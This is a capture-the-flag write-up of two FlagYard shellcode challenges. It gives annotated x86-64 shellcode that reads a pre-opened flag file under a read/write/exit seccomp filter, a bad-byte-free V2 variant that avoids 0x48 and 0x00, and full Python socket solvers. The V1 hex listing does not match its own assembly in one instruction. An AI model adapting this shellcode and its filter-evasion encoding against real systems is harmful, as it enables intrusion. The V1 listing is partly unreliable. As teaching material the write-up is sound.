---
title: "FlagYard mutedShell V1 → V2 — Deep-Dive Writeup (with tiny Python solvers)"
date: 2025-11-11
categories:
  - FlagYard
tags:
  - reverse-engineering
  - pwn
  - shellcode
  - seccomp
  - bad-bytes
---

# Overview

Two micro pwn challenges focused on:
- Executing attacker-supplied shellcode from an RWX page,
- Under a tight seccomp filter that allows only read, write, and exit,
- With V2 adding a hostile “byte-level” validator that rejects 0x48 and 0x00 bytes in the payload.

Remote service for both: 34.252.33.37:31886

Core idea:
- The binary opens("./flag", O_RDONLY) before enabling seccomp, so the flag is already available via a file descriptor (typically fd=3).
- Your shellcode must only use allowed syscalls:
  - read(0), write(1), exit(60).
- Strategy: Read the flag from fd=3 into the stack, then write it to stdout, and exit.

V2 twist:
- The input shellcode is rejected if any byte equals 0x48 (REX.W prefix) or 0x00 (NUL).
- You must encode shellcode without 0x48 prefixes and without any 0x00 bytes.

This writeup walks you through V1 first, then V2, with annotated shellcode and minimal Python solvers that work on any OS.

---

# mutedShell V1

Remote: 34.252.33.37:31886

## Binary behavior (from decompile)

Key sequence in `main`:
- `setbuf(stdin/stdout/stderr, NULL)` → unbuffered I/O.
- `int fd = open("./flag", 0)` → flag opened before the sandbox; fd stays open.
- `buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)` → RWX page for shellcode.
- `puts("Send your shellcode:")`, `read(0, buf, 0x100)` → your code is loaded.
- `install_seccomp()`:
  - prctl(PR_SET_NO_NEW_PRIVS, 1)
  - prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)
  - BPF filter:
    - Checks arch = AUDIT_ARCH_X86_64.
    - Allows only syscalls: read (0), write (1), exit (60).
    - Everything else returns KILL_PROCESS (0x80000000).
- `buf();` → jumps into your shellcode.

Implications:
- You cannot open/exec/dup/etc. Only read/write/exit are safe.
- Use the already-opened flag fd (almost always 3: stdio are 0/1/2; next open returns 3).

## Exploit plan

1) Read the flag into the stack:
- rax=0 (SYS_read), rdi=3 (flag fd), rsi=rsp (buffer), rdx=0x400 (size),
- syscall.

2) Capture the number of bytes read for write:
- Move rax → rdx.

3) Write to stdout:
- rax=1 (SYS_write), rdi=1 (stdout), rsi=rsp, rdx=bytes_read,
- syscall.

4) Exit:
- rax=60 (SYS_exit), rdi=0,
- syscall.

## Compact x86-64 shellcode (V1)

Readable asm:
- xor rax, rax
- mov rdi, 3
- mov rsi, rsp
- mov rdx, 0x400
- syscall
- xchg rax, rdx
- mov al, 1
- mov edi, 1
- syscall
- mov eax, 60
- xor edi, edi
- syscall

Hex bytes:
48 31 c0
48 c7 c7 03 00 00 00
48 89 e6
48 c7 c2 00 04 00 00
0f 05
48 91
b0 01
bf 01 00 00 00
0f 05
b8 3c 00 00 00
31 ff
0f 05

## Minimal Python solver (standard library only)

- Waits for the “Send your shellcode:” banner,
- Sends pre-built shellcode,
- Prints whatever the service returns (the flag).

```python
import socket

HOST = "" # Replace This
PORT = 0 # Replace This

# pre-assembled x86-64 shellcode:
#   xor rax, rax
#   mov rdi, 3
#   mov rsi, rsp
#   mov rdx, 0x400
#   syscall                  ; read(3, rsp, 0x400)
#   mov rdx, rax
#   mov eax, 1
#   mov edi, 1
#   syscall                  ; write(1, rsp, rax)
#   mov eax, 60
#   xor edi, edi
#   syscall                  ; exit(0)
shellcode = (
    b"\x48\x31\xc0"                          # xor rax, rax
    b"\x48\xc7\xc7\x03\x00\x00\x00"          # mov rdi, 3
    b"\x48\x89\xe6"                          # mov rsi, rsp
    b"\x48\xc7\xc2\x00\x04\x00\x00"          # mov rdx, 0x400
    b"\x0f\x05"                              # syscall (read)
    b"\x48\x89\xc2"                          # mov rdx, rax
    b"\xb8\x01\x00\x00\x00"                  # mov eax, 1
    b"\xbf\x01\x00\x00\x00"                  # mov edi, 1
    b"\x0f\x05"                              # syscall (write)
    b"\xb8\x3c\x00\x00\x00"                  # mov eax, 60
    b"\x31\xff"                              # xor edi, edi
    b"\x0f\x05"                              # syscall (exit)
)

def recv_until(sock, token: bytes, timeout=5.0):
    sock.settimeout(timeout)
    data = b""
    try:
        while token not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def recvall(sock, timeout=3.0):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        except socket.timeout:
            break
    return b"".join(chunks)

def main():
    with socket.create_connection((HOST, PORT), timeout=5.0) as s:
        _banner = recv_until(s, b"Send your shellcode:")
        s.sendall(shellcode)
        out = recvall(s, timeout=5.0)
        if out:
            try:
                print(out.decode("utf-8", errors="replace").strip())
            except Exception:
                print(repr(out))

if __name__ == "__main__":
    main()
```

Tips:
- If infra ever changes and fd ≠ 3, a robust variant can try fds 3..8: perform read on each and keep the first with a positive return, then write it. Not needed here, but useful in general.

---

# mutedShell V2

Remote: 34.252.33.37:31886

## What changed vs V1

Same flow and same seccomp policy, but with a validator before installing seccomp:
- Rejects the shellcode if any byte equals 0x48 or 0x00.

From decompile:
```c
for (i=0; i<len; ++i) {
  if (buf[i] == 0x48 || buf[i] == 0x00) {
    puts("Invalid byte detected in shellcode. Bye!");
    exit(1);
  }
}
```

Consequences:
- No 0x48 REX.W prefixes (which most “normal” 64-bit encodings use, e.g., mov rdi, imm).
- No NUL bytes anywhere (no zero bytes in immediates or instructions).

But Linux x86‑64 syscalls only require correct register values, not necessarily 64-bit encodings of every move. We can:
- Use 32-bit register ops (EAX/EDI/EDX) which zero-extend into 64-bit, satisfying the syscall ABI.
- Use push/pop to load small immediates without zeros.
- Construct 0x400 in EDX with shifts to avoid zero bytes.

## Bad‑byte‑free shellcode (V2)

Plan (same logic, different encoding):
- Set RSI = RSP: push rsp; pop rsi
- rax=0 (read): xor eax,eax
- rdi=3: push 3; pop rdi
- rdx=0x400: xor edx,edx; inc edx; shl edx,8; shl edx,2
- syscall (read)
- rdx = bytes_read: mov edx, eax
- rax=1 (write): xor eax,eax; inc eax
- rdi=1: push 1; pop rdi
- syscall (write)
- exit(0): push 60; pop rax; xor edi,edi; syscall

Hex bytes (verified: no 0x48, no 0x00):
54 5e 31 c0 6a 03 5f 31 d2 ff c2 c1 e2 08 c1 e2 02 0f 05 89 c2 31 c0 ff c0 6a 01 5f 0f 05 6a 3c 58 31 ff 0f 05

Why this works:
- Writing to EAX/EDI/EDX zero-extends into RAX/RDI/RDX on x86‑64.
- `syscall` uses RAX for the number and RDI/RSI/RDX for args 1..3.
- We avoid 0x48 by never using REX.W encodings.
- We avoid 0x00 by avoiding immediates containing zeros and using shifts or push/pop.

## Minimal Python solver (V2)

```python
import socket

HOST = "" # Replace with actual host
PORT = 0 # Replace with actual port

# Shellcode (no 0x00 or 0x48 bytes):
#   push rsp           ; 54
#   pop rsi            ; 5e
#   xor eax, eax       ; 31 c0                ; rax = SYS_read (0)
#   push 3             ; 6a 03
#   pop rdi            ; 5f                   ; rdi = 3 (flag fd)
#   xor edx, edx       ; 31 d2
#   inc edx            ; ff c2                ; edx = 1
#   shl edx, 8         ; c1 e2 08             ; edx = 0x100
#   shl edx, 2         ; c1 e2 02             ; edx = 0x400
#   syscall            ; 0f 05                ; read(3, rsp, 0x400)
#   mov edx, eax       ; 89 c2                ; rdx = bytes_read
#   xor eax, eax       ; 31 c0
#   inc eax            ; ff c0                ; rax = SYS_write (1)
#   push 1             ; 6a 01
#   pop rdi            ; 5f                   ; rdi = 1 (stdout)
#   syscall            ; 0f 05                ; write(1, rsp, n)
#   push 60            ; 6a 3c
#   pop rax            ; 58                   ; rax = SYS_exit (60)
#   xor edi, edi       ; 31 ff                ; rdi = 0
#   syscall            ; 0f 05                ; exit(0)
shellcode = (
    b"\x54"
    b"\x5e"
    b"\x31\xc0"
    b"\x6a\x03"
    b"\x5f"
    b"\x31\xd2"
    b"\xff\xc2"
    b"\xc1\xe2\x08"
    b"\xc1\xe2\x02"
    b"\x0f\x05"
    b"\x89\xc2"
    b"\x31\xc0"
    b"\xff\xc0"
    b"\x6a\x01"
    b"\x5f"
    b"\x0f\x05"
    b"\x6a\x3c"
    b"\x58"
    b"\x31\xff"
    b"\x0f\x05"
)

def recv_until(sock, token: bytes, timeout=5.0):
    sock.settimeout(timeout)
    data = b""
    try:
        while token not in data:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def recvall(sock, timeout=5.0):
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
        except socket.timeout:
            break
    return b"".join(chunks)

def main():
    with socket.create_connection((HOST, PORT), timeout=5.0) as s:
        _ = recv_until(s, b"Send your shellcode:")
        s.sendall(shellcode)
        out = recvall(s, timeout=5.0)
        if out:
            try:
                print(out.decode("utf-8", errors="replace").strip())
            except Exception:
                print(repr(out))

if __name__ == "__main__":
    main()
```

---

## Why fd=3?

UNIX descriptor behavior:
- 0,1,2 are stdin/stdout/stderr.
- The first successful open() returns 3.
- Since the program opens "./flag" once and never closes it before executing your payload, your shellcode can read from fd=3 without making a forbidden syscall.

## Seccomp specifics

From the decompiled `install_seccomp()`:
- PR_SET_NO_NEW_PRIVS is enabled (blocks privilege escalations).
- A BPF program checks:
  - arch == AUDIT_ARCH_X86_64,
  - syscall number equals 0 (read), 1 (write), or 60 (exit) → returns ALLOW (0x7fff0000),
  - otherwise returns KILL_PROCESS (0x80000000).

This means:
- `exit_group` (231) is forbidden; use `exit` (60).
- `open`, `openat`, `mprotect`, `socket`, etc., are forbidden and will immediately kill the process.

## Troubleshooting

- No output? Make sure you wait for the banner “Send your shellcode:” before sending bytes.
- For V2, if it says “Invalid byte detected…”:
  - Ensure your payload contains no 0x48 or 0x00. Hex-dump to be sure.
- Windows/macOS users:
  - These solvers use only Python’s standard library. No pwntools/binutils needed.

## Result

Running the solvers prints the flag straight from the remote service.

- V1: straightforward 64-bit encodings.
- V2: bad-byte-free trickery with push/pop and shifts.

That’s it: muted shell, loud flag.
